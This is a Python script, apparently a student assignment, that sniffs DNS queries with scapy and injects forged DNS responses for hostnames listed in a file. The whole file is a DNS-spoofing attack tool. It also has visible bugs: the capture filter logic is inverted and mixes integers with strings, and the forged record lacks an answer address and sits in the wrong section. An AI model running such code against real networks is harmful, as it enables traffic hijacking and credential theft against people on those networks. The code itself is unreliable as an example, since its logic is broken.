"""
Author: Scott Walters
CSCSI-397
Assignment 4

This project is meant to successfully perform DNS packet injection
"""
from typing import SupportsAbs
import scapy.all as scapy
from scapy.config import LayersList, conf
from scapy.sendrecv import SndRcvHandler
import argparse
parser = argparse.ArgumentParser(add_help= False)
parser.add_argument("-i", "--interface", help = "interface name", default= "en0")
parser.add_argument("-h", "--hostnames", help = "host names", default = "hostnames")
args = parser.parse_args()
urls = []

#Send a spoofed response if and only if the IP and URL match those given in the -h arg
def spoof(packet):
    urlMatch(urls, packet[scapy.DNSQR].qname)
    if packet[scapy.DNS].qr == 0 and urlMatch(urls, packet[scapy.DNSQR].qname):
        sp_pkt = build_response(packet)
        scapy.sendp(sp_pkt, iface = args.interface)

#Match query URL against URLs given in -h arg
def urlMatch(urls, query):
    for url in urls:
        if url.endswith("\n"):
            temp = url[:-1]
        else:
            temp = url
        if str(query) == ("b\'" + temp + ".\'"):
            return True
    return False

#Build spoofed response packet
def build_response(packet):
    eth = scapy.Ether(
        src = packet[scapy.Ether].dst,
        dst = packet[scapy.Ether].src
    )
    ip = scapy.IP(
        src = packet[scapy.IP].dst,
        dst = packet[scapy.IP].src
    )
    udp = scapy.UDP(
        sport = packet[scapy.UDP].dport,
        dport = packet[scapy.UDP].sport
    )
    dns = scapy.DNS(
        id = packet[scapy.DNS].id,
        qd = packet[scapy.DNS].qd,
        aa = 1,
        rd = 0,
        qr = 1,
        qdcount = 1,
        ancount = 1,
        nscount = 0,
        arcount = 0,
        ar = scapy.DNSRR(
            rrname = packet[scapy.DNS].qd.qname, 
            type = 'A',
            ttl = 600,
        )
    )
    sp_pkt = eth / ip / udp / dns
    return sp_pkt

#Separate the IPs and URLs into separate lists at matching indicies 
def separate(hosts):
    ip=[]
    for ndx in range(len(hosts)):
        ip.append(hosts[ndx][0])
        urls.append(hosts[ndx][1])
    return ip, urls

#Build packet filter for DNS query and IPs given in -h arg
def build_filter(hosts):
    ips, urls = separate(hosts)
    filter = "udp dst port 53"
    if not ips:
        filter += " and ( host "
        for ip in range (len(ips) -1):
            filter += ip + " or host "
        filter += ip + ")"
    return filter

def main():
    conf.use_pcap = True
    i = args.interface
    h = args.hostnames
    f = open(h, 'r')
    hosts = f.readlines()
    for x in range(len(hosts)):
        hosts.insert(x, hosts.pop(x).split(","))
    filter = build_filter(hosts)
    sniff = scapy.sniff( iface = i, filter = filter, prn = spoof)

if __name__ == "__main__":
    main()